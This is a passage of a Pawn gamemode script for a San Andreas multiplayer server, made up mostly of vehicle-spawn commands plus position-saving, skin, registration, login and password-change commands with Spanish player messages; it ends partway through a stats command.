CMD:washington(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,421);
	return 1;
}
CMD:bobcat(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,422);
	return 1;
}
CMD:mr_whoopee(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,423);
	return 1;
}
CMD:bf_injection(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,424);
	return 1;
}
CMD:premier(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,426);
	return 1;
}
CMD:enforcer(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,427);
	return 1;
}
CMD:seguricar(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,428);
	return 1;
}
CMD:banshee(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,429);
	return 1;
}
CMD:predator(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,430);
	return 1;
}
CMD:bus(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,431);
	return 1;
}
CMD:barracks(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,433);
	return 1;
}
CMD:hotknife(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,434);
	return 1;
}
CMD:article_Trailer(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,435);
	return 1;
}
CMD:previon(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,436);
	return 1;
}
CMD:coach(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,437);
	return 1;
}
CMD:cabbie(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,438);
	return 1;
}
CMD:stallion(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,439);
	return 1;
}
CMD:rumpo(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,440);
	return 1;
}
CMD:rc_bandit(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,441);
	return 1;
}
CMD:romero(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,442);
	return 1;
}
CMD:packer(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,443);
	return 1;
}
CMD:monster(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,444);
	return 1;
}
CMD:admiral(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,445);
	return 1;
}
CMD:squallo(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,446);
	return 1;
}
CMD:seasparrow(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,447);
	return 1;
}
CMD:pizzaboy(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,448);
	return 1;
}
CMD:tram(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,449);
	return 1;
}
CMD:article_trailer_2(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,450);
	return 1;
}
CMD:turismo(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,451);
	return 1;
}
CMD:auto(playerid,params[])
{
#pragma unused params
CarSpawner(playerid,451);
return 1;
}
CMD:speeder(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,452);
	return 1;
}
CMD:teefer(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,453);
	return 1;
}
CMD:tropic(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,454);
	return 1;
}
CMD:flatbed(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,455);
	return 1;
}
CMD:yankee(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,456);
	return 1;
}
CMD:caddy(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,457);
	return 1;
}
CMD:solair(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,458);
	return 1;
}
CMD:rc_van(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,459);
	return 1;
}
CMD:skimmer(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,460);
	return 1;
}
CMD:pcj_600(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,461);
	return 1;
}
CMD:faggio(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,462);
	return 1;
}
CMD:freeway(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,463);
	return 1;
}
CMD:rc_raider(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,465);
	return 1;
}
CMD:glendale(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,466);
	return 1;
}
CMD:oceanic(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,467);
	return 1;
}
CMD:sanchez(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,468);
	return 1;
}
CMD:sparrow(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,469);
	return 1;
}
CMD:patriot(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,470);
	return 1;
}
CMD:quad(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,471);
	return 1;
}
CMD:coastguard(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,472);
	return 1;
}
CMD:dinghy(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,473);
	return 1;
}
CMD:hermes(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,474);
	return 1;
}
CMD:sabre(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,475);
	return 1;
}
CMD:rustler(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,476);
	return 1;
}
CMD:zr_350(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,477);
	return 1;
}
CMD:walton(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,478);
	return 1;
}
CMD:regina(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,479);
	return 1;
}
CMD:comet(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,480);
	return 1;
}
CMD:bmx(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,481);
	return 1;
}
CMD:burrito(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,482);
	return 1;
}
CMD:camper(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,483);
	return 1;
}
CMD:marquis(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,484);
	return 1;
}
CMD:baggage(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,485);
	return 1;
}
CMD:dozer(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,486);
	return 1;
}
CMD:maverick(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,487);
	return 1;
}
CMD:san_news_maverick(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,488);
	return 1;
}
CMD:rancher(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,489);
	return 1;
}
CMD:fbi_rancher(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,490);
	return 1;
}
CMD:virgo(playerid,params[])
{
	#pragma unused params
	CarSpawner(playerid,491);
	return 1;
}
CMD:greenwood(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,492);
	return 1;
}
CMD:jetmax(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,493);
	return 1;
}
CMD:hotring_racer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,494);
	return 1;
}
CMD:sandking(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,495);
	return 1;
}
CMD:blista_compact(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,496);
	return 1;
}
CMD:police_maverick(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,497);
	return 1;
}
CMD:boxville(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,498);
	return 1;
}
CMD:benson(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,499);
	return 1;
}
CMD:mesa(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,500);
	return 1;
}
CMD:rc_goblin(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,501);
	return 1;
}
CMD:hotring_racer2(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,502);
	return 1;
}
CMD:hotring_racer3(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,503);
	return 1;
}
CMD:bloodring_banger(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,504);
	return 1;
}
CMD:rancher2(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,505);
	return 1;
}
CMD:super_gt(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,506);
	return 1;
}
CMD:elegant(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,507);
	return 1;
}
CMD:journey(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,508);
	return 1;
}
CMD:bike(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,509);
	return 1;
}
CMD:mountain_bike(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,510);
	return 1;
}
CMD:beagle(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,511);
	return 1;
}
CMD:cropduster(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,512);
	return 1;
}
CMD:stuntplane(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,513);
	return 1;
}
CMD:tanker(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,514);
	return 1;
}
CMD:roadtrain(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,515);
	return 1;
}
CMD:nebula(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,516);
	return 1;
}
CMD:majestic(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,517);
	return 1;
}
CMD:buccaneer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,518);
	return 1;
}
CMD:shamal(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,519);
	return 1;
}
CMD:fcr(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,521);
	return 1;
}
CMD:nrg(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,522);
	return 1;
}
CMD:moto(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,522);
	return 1;
}
CMD:hpv1000(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,523);
	return 1;
}
CMD:cement_truck(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,524);
	return 1;
}
CMD:towtruck(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,525);
	return 1;
}
CMD:fortune(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,526);
	return 1;
}
CMD:cadrona(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,527);
	return 1;
}
CMD:fbi_truck(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,528);
	return 1;
}
CMD:willard(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,529);
	return 1;
}
CMD:forklift(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,530);
	return 1;
}
CMD:tractor(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,531);
	return 1;
}
CMD:combine_harvester(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,532);
	return 1;
}
CMD:feltzer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,533);
	return 1;
}
CMD:remington(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,534);
	return 1;
}
CMD:slamvan(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,535);
	return 1;
}
CMD:blade(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,536);
	return 1;
}
CMD:freight(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,537);
	return 1;
}
CMD:brownstreak(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,538);
	return 1;
}
CMD:vortex(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,539);
	return 1;
}
CMD:vincent(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,540);
	return 1;
}
CMD:bullet(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,541);
	return 1;
}
CMD:clover(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,542);
	return 1;
}
CMD:sadler(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,543);
	return 1;
}
CMD:firetruck_la(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,544);
	return 1;
}
CMD:hustler(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,545);
	return 1;
}
CMD:intruder(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,546);
	return 1;
}
CMD:primo(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,547);
	return 1;
}
CMD:cargobob(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,548);
	return 1;
}
CMD:tampa(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,549);
	return 1;
}
CMD:sunrise(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,550);
	return 1;
}
CMD:merit(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,551);
	return 1;
}
CMD:utility_van(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,552);
	return 1;
}
CMD:nevada(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,553);
	return 1;
}
CMD:yosemite(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,554);
	return 1;
}
CMD:windsor(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,555);
	return 1;
}
CMD:monster2(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,556);
	return 1;
}
CMD:monster3(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,557);
	return 1;
}
CMD:uranus(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,558);
	return 1;
}
CMD:jester(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,559);
	return 1;
}
CMD:sultan(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,560);
	return 1;
}
CMD:stratum(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,561);
	return 1;
}
CMD:elegy(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,562);
	return 1;
}
CMD:raindance(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,563);
	return 1;
}
CMD:flash(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,565);
	return 1;
}
CMD:tahoma(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,566);
	return 1;
}
CMD:savanna(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,567);
	return 1;
}
CMD:bandito(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,568);
	return 1;
}
CMD:freight_flat_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,569);
	return 1;
}
CMD:streak_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,570);
	return 1;
}
CMD:kart(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,571);
	return 1;
}
CMD:mower(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,572);
	return 1;
}
CMD:dune(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,573);
	return 1;
}
CMD:sweeper(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,574);
	return 1;
}
CMD:broadway(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,575);
	return 1;
}
CMD:tornado(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,576);
	return 1;
}
CMD:at400(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,577);
	return 1;
}
CMD:dft_30(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,578);
	return 1;
}
CMD:huntley(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,579);
	return 1;
}
CMD:stafford(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,580);
	return 1;
}
CMD:bf_400(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,581);
	return 1;
}
CMD:newsvan(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,582);
	return 1;
}
CMD:tug(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,583);
	return 1;
}
CMD:petrol_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,584);
	return 1;
}
CMD:emperor(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,585);
	return 1;
}
CMD:wayfarer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,586);
	return 1;
}
CMD:euros(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,587);
	return 1;
}
CMD:hotdog(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,588);
	return 1;
}
CMD:club(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,589);
	return 1;
}
CMD:freight_box_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,590);
	return 1;
}
CMD:article_trailer_3(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,591);
	return 1;
}
CMD:andromada(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,592);
	return 1;
}
CMD:dodo(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,593);
	return 1;
}
CMD:rc_cam(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,594);
	return 1;
}
CMD:launch(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,595);
	return 1;
}
CMD:police_car_ls(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,596);
	return 1;
}
CMD:police_car_sf(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,597);
	return 1;
}
CMD:police_car_lv(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,598);
	return 1;
}
CMD:police_ranger(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,599);
	return 1;
}
CMD:picador(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,600);
	return 1;
}
CMD:swat(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,601);
	return 1;
}
CMD:alpha(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,602);
	return 1;
}
CMD:phoenix(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,603);
	return 1;
}
CMD:glendale_shit(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,604);
	return 1;
}
CMD:sadler_shit(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,605);
	return 1;
}
CMD:baggage_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,606);
	return 1;
}
CMD:baggage_trailer2(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,607);
	return 1;
}
CMD:tug_stairs_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,608);
	return 1;
}
CMD:boxville2(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,609);
	return 1;
}
CMD:farm_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,610);
	return 1;
}
CMD:utility_trailer(playerid,params[])
{
#pragma unused params
	CarSpawner(playerid,611);
	return 1;
}

CMD:90(playerid,params[])
{
	#pragma unused params
	new Float:angulo; new Veh; Veh = GetPlayerVehicleID(playerid);
	GetVehicleZAngle(Veh, angulo); SetVehicleZAngle(Veh, angulo+90);
	return 1;
}

CMD:180(playerid,params[])
{
	#pragma unused params
	new Float:angulo; new Veh; Veh = GetPlayerVehicleID(playerid);
	GetVehicleZAngle(Veh, angulo); SetVehicleZAngle(Veh, angulo+180);
	return 1;
}

CMD:v(playerid,params[]){
	new tmp[128], tmp2[128], tmp3[128], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index); tmp3 = strtok(params,Index);
	if(isnull(tmp)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /V [Modelo/Nombre] [Color1] [Color2]");
	new car, colour1, colour2, string[100];
	if(!IsNumeric(tmp)) car = GetVehicleModelIDFromName(tmp); else car = strval(tmp);
	if(car < 400 || car > 611) return  SendClientMessage(playerid, red, "|Error| »{EAEAEA} Modelo de vehiculo no encontrado.");
	if(isnull(tmp2)) colour1 = random(126); else colour1 = strval(tmp2);
	if(isnull(tmp3)) colour2 = random(126); else colour2 = strval(tmp3);
	new LVehicleID,Float:X,Float:Y,Float:Z, Float:Angle,int1;	GetPlayerPos(playerid, X,Y,Z);	GetPlayerFacingAngle(playerid,Angle);   int1 = GetPlayerInterior(playerid);
	LVehicleID = CreateVehicle(car, X+3,Y,Z, Angle, colour1, colour2, -1); LinkVehicleToInterior(LVehicleID,int1);
	format(string, sizeof(string), "|Info| »{EAEAEA} Has aparecido un %s. {FF0000}[ID: %d]", VehicleName[car-400], car, colour1, colour2);
	PutPlayerInVehicle(playerid, LVehicleID, 0);
	VehicleInfo[LVehicleID][Temp] = 1;
	return SendClientMessage(playerid,red, string);
}
//----------------------===== Place & Skin Saving =====-------------------------
CMD:cargarpos(playerid,params[]) {
    #pragma unused params
        if(PlayerInfo[playerid][Level] >= 0) {
	    if (dUserINT(PlayerName2(playerid)).("x")!=0) {
            SetTimerEx("CargarObjetos", 3000, 0, "d", playerid);
	 		TogglePlayerControllable(playerid, 0);
		    PutAtPos(playerid);
			SetPlayerVirtualWorld(playerid, (dUserINT(PlayerName2(playerid)).("world")) );
			return SendClientMessage(playerid,red,"|Info| »{EAEAEA} posición cargada.");
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} No tienes ninguna posición guardada.");
 	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:guardarpos(playerid,params[]) {
    #pragma unused params
        if(PlayerInfo[playerid][Level] >= 0) {
		new Float:x,Float:y,Float:z, interior;
		GetPlayerPos(playerid,x,y,z);	interior = GetPlayerInterior(playerid);
		dUserSetINT(PlayerName2(playerid)).("x",floatround(x));
		dUserSetINT(PlayerName2(playerid)).("y",floatround(y));
		dUserSetINT(PlayerName2(playerid)).("z",floatround(z));
		dUserSetINT(PlayerName2(playerid)).("interior",interior);
		dUserSetINT(PlayerName2(playerid)).("world", (GetPlayerVirtualWorld(playerid)) );
		return SendClientMessage(playerid,red,"|Info| »{EAEAEA} posición actual guardada.");
  } else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:skin(playerid,params[]) {
	if((dUserINT(PlayerName2(playerid)).("MenuImagen")) == 1){
		ShowModelSelectionMenu(playerid, skinlist, "~w~Skins", DIALOG_BG_COLOR, PREV_BG_COLOR, PREV_BG_COLOR2);
	}else{
 		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Skin [SkinID]");
		new string[128], SkinID = strval(params);
		if((SkinID == 0)||(SkinID == 7)||(SkinID >= 9 && SkinID <= 41)||(SkinID >= 43 && SkinID <= 64)||(SkinID >= 66 && SkinID <= 73)||(SkinID >= 75 && SkinID <= 85)||(SkinID >= 87 && SkinID <= 118)||(SkinID >= 120 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 207)||(SkinID >= 209 && SkinID <= 264)||(SkinID >= 274 && SkinID <= 288)||(SkinID >= 290 && SkinID <= 299))
		{
 			dUserSetINT(PlayerName2(playerid)).("FavSkin",SkinID);
		 	format(string, sizeof(string), "|Info| »{EAEAEA} Tu skin se ha guardado correctamente. {FF0000}[SkinID: %d]",SkinID);
		 	SendClientMessage(playerid,red,string);
		 	dUserSetINT(PlayerName2(playerid)).("UseSkin",1);
    	    SetPlayerSkin(playerid,dUserINT(PlayerName2(playerid)).("FavSkin"));
		} else return SendClientMessage(playerid, green, "|Info| »{EAEAEA} ID de skin no encontrada.");
	}
	return 1;
}

CMD:rskin(playerid,params[])
#pragma unused params
{
	if(PlayerInfo[playerid][Vip] >= 0 || IsPlayerAdmin(playerid)) {
	    new string[128];
		SetPlayerSkin(playerid, random(300));
 		format(string, sizeof(string), "|Info| »{EAEAEA} Tu skin se ha cambiado correctamente. {FF0000}[SkinID: %d]",GetPlayerSkin(playerid));
 		SendClientMessage(playerid,red,string);
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 0{FFFFFF} para usar este comando.");
	return 1;
}
//====================== [REGISTER  &  LOGIN] ==================================
CMD:register(playerid,params[])
{
    if(GetPlayerScore(playerid)<=-25) return SendClientMessage(playerid, COLOR_RED, "|Error| »{EAEAEA} Debes tener mas de {FF0000}25{EAEAEA} de score para poder registrarte.");
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"|Cuenta| »{EAEAEA} Ya estas registrado.");
    format(lstring,256,"\n{FFFFFF}Bienvenido a {C0C0C0}M A T R I X.\n{FFFFFF}El nick {FF0000}%s{FFFFFF} no esta registrado.\n{FFFFFF}Ingresa una {00BFFF}contraseña{FFFFFF} para registrarte.",pName(playerid));
    ShowPlayerDialog(playerid,REGISTRO,DIALOG_STYLE_INPUT,"{FF0000}REGISTRO",lstring,"Registrar","");
    return 1;
}

CMD:login(playerid,params[])
{
    if (!udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"|Cuenta| »{EAEAEA} Tu no tienes una cuenta.");
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"|Cuenta| »{EAEAEA} Ya has ingresado con tu cuenta.");
    format(lstring,256,"\n{FFFFFF}Bienvenido nuevamente a{FF0000} Destruccion Latina.\n{FFFFFF}El nick {00FF00}%s{FFFFFF} esta registrado.\n{FFFFFF}Ingresa la {00BFFF}contraseña{FFFFFF} para acceder a tu cuenta.",pName(playerid));
    ShowPlayerDialog(playerid,INGRESO,DIALOG_STYLE_INPUT,"{FF0000}INGRESO",lstring,"Acceder","");
	return 1;
}

LoginPlayer(playerid)
{
    SetPlayerScore(playerid, dUserINT(PlayerName2(playerid)).("score"));
	if(ServerInfo[GiveMoney] == 1) {ResetPlayerMoney(playerid); GivePlayerMoney(playerid, dUserINT(PlayerName2(playerid)).("money") ); }
	dUserSetINT(PlayerName2(playerid)).("loggedin",1);
	PlayerInfo[playerid][Deaths] = (dUserINT(PlayerName2(playerid)).("deaths"));
	PlayerInfo[playerid][Kills] = (dUserINT(PlayerName2(playerid)).("kills"));
	PlayerInfo[playerid][Twin] = (dUserINT(PlayerName2(playerid)).("twin"));
	PlayerInfo[playerid][Rwin] = (dUserINT(PlayerName2(playerid)).("rwin"));
 	PlayerInfo[playerid][Level] = (dUserINT(PlayerName2(playerid)).("level"));
 	PlayerInfo[playerid][Vip] = (dUserINT(PlayerName2(playerid)).("vip"));
   	PlayerInfo[playerid][hours] = dUserINT(PlayerName2(playerid)).("hours");
   	PlayerInfo[playerid][mins] = dUserINT(PlayerName2(playerid)).("minutes");
   	PlayerInfo[playerid][secs] = dUserINT(PlayerName2(playerid)).("seconds");
   	SetPlayerScore(playerid, dUserINT(PlayerName2(playerid)).("score"));
	PlayerInfo[playerid][Registered] = 1;
 	PlayerInfo[playerid][LoggedIn] = 1;
}

CMD:cambiarpass(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /CambiarPass [NewPass]");
		if(strlen(params) < 4) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} La contraseña debe ser mayor a 3 digitos.");
		new string[128];
		dUserSetINT(PlayerName2(playerid)).("password_hash",udb_hash(params) );
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
        format(string, sizeof(string),"|Info| »{EAEAEA} Te has cambiado la contraseña correctamente. {FF0000}[NewPass: %s]",params);
		return SendClientMessage(playerid,red,string);
	} else return SendClientMessage(playerid,red, "|Error| »{EAEAEA} No tienes una cuenta registrada.");
}

CMD:setpass(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetPass [Cuenta] [NewPass]");
		if(strlen(tmp2) < 4 || strlen(tmp2) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} La contraseña debe ser mayor a 3 digitos.");
		if(udb_Exists(tmp)) {
			dUserSetINT(tmp).("password_hash", udb_hash(tmp2));
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"|Info| »{EAEAEA} Le has cambiado la contraseña a la cuenta de {0080FF}%s. {FF0000}[NewPass: %s]", tmp, tmp2);
    	    CMDMessageToAdmins(playerid,"/SetPass");
			return SendClientMessage(playerid,red,string);
		} else return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Esa cuenta no existe.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
}

#if defined USE_STATS
CMD:resetstats(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		// save as backup
	   	dUserSetINT(PlayerName2(playerid)).("oldkills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("olddeaths",PlayerInfo[playerid][Deaths]);
		// stats reset
		PlayerInfo[playerid][Kills] = 0;
		PlayerInfo[playerid][Deaths] = 0;
		dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
        PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return SendClientMessage(playerid,red,"|Cuenta| »{EAEAEA} Has reseteado tus stats.");
	} else return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Debes tener una cuenta para usar este comando.");
}
#endif

#if defined USE_STATS
CMD:stats(playerid,params[]) {
    new player1;
	new string[1000], pDeaths, h, m, s;
	new Float:player1health, Float:player1armour;
	new P1Register[4], file[256], RegDate[256], year, month, day;
	if(isnull(params)) player1 = playerid;
	else player1 = strval(params);
